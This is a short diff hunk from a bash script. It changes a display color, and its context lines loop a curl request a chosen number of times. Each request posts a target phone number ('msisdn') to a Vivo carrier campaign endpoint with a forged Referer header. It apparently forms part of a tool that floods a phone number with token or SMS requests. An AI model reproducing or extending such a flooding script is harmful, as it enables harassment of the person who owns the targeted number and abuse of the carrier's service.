@@ -154,7 +154,7 @@ esac
 done
 echo
 
-echo -e "\e[0m\e[01;37;46m TOKEN 9 teste \e[0m"
+echo -e "\e[0m\e[01;37;45m TOKEN 9 teste \e[0m"
 for i in $(seq $VEZES);
 do
 response=$(data=$"msisdn=$NUMERO&campid=b452ab27-9de2-4e1b-9263-6b444c24f8dc&opCode=VV" && site="http://interatividade.vivo.ddivulga.com/carrotProcess" && curl -s "${site}" -H "Referer: http://navegue.vivo.com.br/" -d "${data}")
